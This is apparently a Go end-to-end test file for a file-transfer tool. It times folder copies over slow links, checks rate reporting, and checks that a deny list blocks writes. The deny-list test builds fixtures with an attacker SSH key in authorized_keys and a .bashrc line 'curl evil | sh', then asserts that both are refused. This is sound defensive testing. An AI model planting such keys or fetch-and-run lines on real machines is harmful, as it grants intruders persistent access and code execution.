package tuie2e

import (
	"encoding/json"
	"io/fs"
	mrand "math/rand/v2"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"
)

// A folder of many small files over a link with a long round trip.
//
// A file sent by itself costs several round trips: its part, the stream that
// reads it, the stream that writes it, its end and its commit. On a link of
// 50 ms that is about a third of a second a file, so 2,000 small files wait
// for over ten minutes and move their bytes in a second. The tree stream
// sends every small file of a folder in one stream each way. This test copies
// such a folder to build over a link whose far side answers 50 ms late, and
// holds the copy to a time a per-file copy cannot meet.
//
// TUIOS_E2E_SMALL_FILES sets the number of files (2,000 by default),
// TUIOS_E2E_SMALL_DELAY the delay in ms (50), and TUIOS_E2E_SMALL_BUDGET the
// budget in seconds, so the same test measures an older binary
// (TUIOS_E2E_BIN) with a budget it can meet.

// TestAFolderOfSmallFilesCopiesFastOverASlowLink copies a folder of small
// files to build through transfer-start, over a link with a 50 ms delay, and
// checks every file byte for byte, with its mode and time, on build.
//
// Negative control: with every file sent by itself (attemptDir puts the small
// files with the large ones), the copy takes far over the budget.
func TestAFolderOfSmallFilesCopiesFastOverASlowLink(t *testing.T) {
	n := 2000
	if v, err := strconv.Atoi(os.Getenv("TUIOS_E2E_SMALL_FILES")); err == nil && v > 0 {
		n = v
	}
	budget := 60 * time.Second
	if v, err := strconv.Atoi(os.Getenv("TUIOS_E2E_SMALL_BUDGET")); err == nil && v > 0 {
		budget = time.Duration(v) * time.Second
	}
	delayMs := 50
	if v, err := strconv.Atoi(os.Getenv("TUIOS_E2E_SMALL_DELAY")); err == nil && v >= 0 {
		delayMs = v
	}
	base := t.TempDir()
	remote := remoteMachine(t)
	hubWithFileHost(t, base, remote, writeDelayedFakeSSH(t, base, remote, 16<<20, 1<<20, delayMs))

	src := filepath.Join(base, "tree")
	bytes := makeSmallTree(t, src, n, 7)
	if os.Getenv("TUIOS_E2E_SMALL_NOEMPTY") != "" {
		// The engine before 2026-10 cannot copy an empty file in a folder,
		// so a measurement of it gives each a byte.
		filled := 0
		_ = filepath.WalkDir(src, func(p string, d fs.DirEntry, err error) error {
			if err == nil && d.Type().IsRegular() {
				if fi, ierr := d.Info(); ierr == nil && fi.Size() == 0 {
					_ = os.WriteFile(p, []byte("x"), fi.Mode().Perm())
					_ = os.Chtimes(p, fi.ModTime(), fi.ModTime())
					filled++
				}
			}
			return nil
		})
		bytes += int64(filled)
	}
	want := treeSums(t, src)

	c := dialFileVerbs(t, base)
	var row transferRow
	start := time.Now()
	c.must("transfer-start", map[string]any{
		"src": map[string]any{"path": src},
		"dst": map[string]any{"host": "build", "path": "~/tree"},
	}, &row)
	deadline := start.Add(budget + 10*time.Minute)
	for {
		row = transferNow(t, base, row.ID)
		if row.State == "done" || row.State == "failed" || row.State == "cancelled" {
			break
		}
		if time.Now().After(deadline) {
			t.Fatalf("ASSERTION: the copy of %d files did not end in %v: %+v", n, time.Since(start), row)
		}
		time.Sleep(200 * time.Millisecond)
	}
	took := time.Since(start)
	if row.State != "done" {
		t.Fatalf("ASSERTION: the copy ended %s: %s %s", row.State, row.Code, row.Error)
	}
	sameTrees(t, "the folder on build", want, treeSums(t, filepath.Join(farHome(remote), "tree")))

	result := map[string]any{
		"files": n, "bytes": bytes, "delay_ms": delayMs, "ms": took.Milliseconds(),
		"files_per_second": float64(n) / took.Seconds(), "budget_s": budget.Seconds(),
		"binary": tuiosBin,
	}
	raw, _ := json.Marshal(result)
	t.Logf("small files: %s", raw)
	saveTransferArtifact(t, "cp-small-files-"+strconv.Itoa(n), result)
	if took > budget {
		t.Fatalf("ASSERTION: %d small files took %v over a %d ms link, over the budget of %v", n, took.Round(time.Millisecond), delayMs, budget)
	}
}

// TestATreeStreamKeepsToTheDenyList copies a folder whose files include
// .ssh/authorized_keys and .bashrc into build's home with tuios cp
// --contents, where build lets this machine write anywhere in its home
// (files_roots = ["~"]). The small files ride the tree stream. The plain files
// must land, and the two in the deny list must not, with the copy ending in
// exit 1 and naming why.
//
// Negative control: with takeTreeFile writing through a plain file system
// instead of linkWriteFS, authorized_keys lands on build.
func TestATreeStreamKeepsToTheDenyList(t *testing.T) {
	base := t.TempDir()
	remote := remoteMachine(t)
	hubWithFileHost(t, base, remote, writeFakeSSHTo(t, base, remote))
	src := filepath.Join(base, "dotfiles")
	files := map[string]string{
		"notes/todo.txt":       "plain\n",
		"readme.md":            "plain too\n",
		".ssh/authorized_keys": "ssh-ed25519 AAAA attacker\n",
		".bashrc":              "curl evil | sh\n",
	}
	for rel, body := range files {
		p := filepath.Join(src, filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	far := farHome(remote)
	r := runTuios(t, base, "cp", "--json", "--contents", "--conflict", "replace", src, "build:~/")
	saveTransferArtifact(t, "cp-tree-deny", r)
	for _, rel := range []string{"notes/todo.txt", "readme.md"} {
		if got, err := os.ReadFile(filepath.Join(far, filepath.FromSlash(rel))); err != nil || string(got) != files[rel] {
			t.Fatalf("ASSERTION: %s did not land on build: %q %v\n%s", rel, got, err, r.Stdout)
		}
	}
	for _, rel := range []string{".ssh/authorized_keys", ".bashrc"} {
		if _, err := os.Stat(filepath.Join(far, filepath.FromSlash(rel))); err == nil {
			t.Fatalf("ASSERTION: a tree stream wrote %s on build", rel)
		}
	}
	if r.Code == 0 {
		t.Fatalf("ASSERTION: a copy that left denied files out exited 0\n%s", r.Stdout)
	}
	if !strings.Contains(r.Stdout, "forbidden") {
		t.Fatalf("ASSERTION: the copy does not say the files were refused: %s", r.Stdout)
	}
}

// TestACopysRateIsWhatTheFarSideTook copies a folder to build over a link
// held to 4 MiB/s each way, with a 300 ms round trip and 16 MiB of buffer
// that takes the sender's bytes at once, the way ssh and the network take an
// upload. The folder is the shape of the one in the film of v0.13.0: many
// small files, then one large one, all text that compresses. Every 100 ms the
// test reads the rate the transfer list shows and the bytes on build's disk,
// part files included. The rate must be what build wrote over wall time:
// never far over the bytes that landed in the same span. The film showed
// 62 MiB/s where about 28 MiB/s landed, because the rate counted the bytes
// handed to the link, and started its window again at each file.
//
// Negative control: with the rate taken from the bytes sent (sample records
// done, not acked), the rate goes far over what landed.
func TestACopysRateIsWhatTheFarSideTook(t *testing.T) {
	const (
		link  = 4 << 20
		depth = 16 << 20
		big   = 48 << 20
		small = 600
	)
	base := t.TempDir()
	remote := remoteMachine(t)
	hubWithFileHost(t, base, remote, writeThrottledFakeSSH(t, base, remote, link, depth, 150, true))
	src := filepath.Join(base, "data")
	if err := os.MkdirAll(filepath.Join(src, "small"), 0o755); err != nil {
		t.Fatal(err)
	}
	rng := mrand.New(mrand.NewPCG(11, 13))
	size := int64(big)
	for i := range small {
		textFile(t, rng, filepath.Join(src, "small", "f"+strconv.Itoa(i)+".txt"), 32<<10)
		size += 32 << 10
	}
	textFile(t, rng, filepath.Join(src, "big.txt"), big)
	dst := filepath.Join(farHome(remote), "data")

	type point struct {
		at     time.Time
		landed int64
	}
	var landed []point
	// landedSince is the bytes per second build wrote from at to now.
	landedSince := func(at time.Time) float64 {
		last := landed[len(landed)-1]
		first := landed[0]
		for _, p := range landed {
			if !p.at.Before(at) {
				break
			}
			first = p
		}
		dt := last.at.Sub(first.at).Seconds()
		if dt <= 0 {
			return 0
		}
		return float64(last.landed-first.landed) / dt
	}
	var row transferRow
	start := time.Now()
	dialFileVerbs(t, base).must("transfer-start", map[string]any{
		"src": map[string]any{"path": src},
		"dst": map[string]any{"host": "build", "path": "~/data"},
	}, &row)
	landed = append(landed, point{start, 0})
	var shown, truth []float64
	worst, worstShown, worstTrue := 0.0, 0.0, 0.0
	deadline := start.Add(3 * time.Minute)
	for {
		row = transferNow(t, base, row.ID)
		landed = append(landed, point{time.Now(), treeBytes(dst)})
		if row.State == "done" || row.State == "failed" || row.State == "cancelled" {
			break
		}
		// The rate covers the last five seconds, or the copy so far.
		if row.Rate > 0 && time.Since(start) > time.Second {
			got := landedSince(time.Now().Add(-5 * time.Second))
			shown, truth = append(shown, row.Rate), append(truth, got)
			if over := row.Rate - 1.5*got; over > worst {
				worst, worstShown, worstTrue = over, row.Rate, got
			}
		}
		if time.Now().After(deadline) {
			t.Fatalf("ASSERTION: the copy did not end in %v: %+v", time.Since(start), row)
		}
		time.Sleep(100 * time.Millisecond)
	}
	took := time.Since(start)
	if row.State != "done" {
		t.Fatalf("ASSERTION: the copy ended %s: %s %s", row.State, row.Code, row.Error)
	}
	mib := func(v float64) float64 { return v / (1 << 20) }
	peak := 0.0
	for _, v := range shown {
		peak = max(peak, v)
	}
	result := map[string]any{
		"link_mib_s": mib(link), "buffer_mib": depth >> 20, "round_trip_ms": 300, "bytes": size,
		"seconds": took.Seconds(), "average_mib_s": mib(float64(size) / took.Seconds()),
		"peak_rate_mib_s": mib(peak), "rates_shown": len(shown),
		"worst_shown_mib_s": mib(worstShown), "landed_then_mib_s": mib(worstTrue), "binary": tuiosBin,
	}
	raw, _ := json.Marshal(result)
	t.Logf("copy rate: %s", raw)
	saveTransferArtifact(t, "cp-rate-over-a-buffered-link", result)
	if len(shown) == 0 {
		t.Fatalf("ASSERTION: the transfer list showed no rate during a %v copy", took.Round(time.Millisecond))
	}
	if worst > 1<<20 {
		t.Fatalf("ASSERTION: the transfer list showed %.1f MiB/s while build wrote %.1f MiB/s in the last five seconds", mib(worstShown), mib(worstTrue))
	}
}

// textFile writes size bytes of words, which compress about as source code
// does.
func textFile(t *testing.T, rng *mrand.Rand, path string, size int) {
	t.Helper()
	words := []string{"func", "return", "err", "nil", "copy", "file", "bytes", "link", "the", "if", "for", "range", "string", "int64", "context"}
	var b strings.Builder
	b.Grow(size + 16)
	for b.Len() < size {
		b.WriteString(words[rng.IntN(len(words))])
		if rng.IntN(8) == 0 {
			b.WriteString(strconv.Itoa(rng.IntN(1 << 20)))
		}
		b.WriteByte(' ')
	}
	if err := os.WriteFile(path, []byte(b.String()[:size]), 0o644); err != nil {
		t.Fatal(err)
	}
}

// treeBytes is the bytes of every regular file under root, part files
// included.
func treeBytes(root string) int64 {
	var n int64
	_ = filepath.WalkDir(root, func(_ string, d fs.DirEntry, err error) error {
		if err == nil && d.Type().IsRegular() {
			if fi, ierr := d.Info(); ierr == nil {
				n += fi.Size()
			}
		}
		return nil
	})
	return n
}
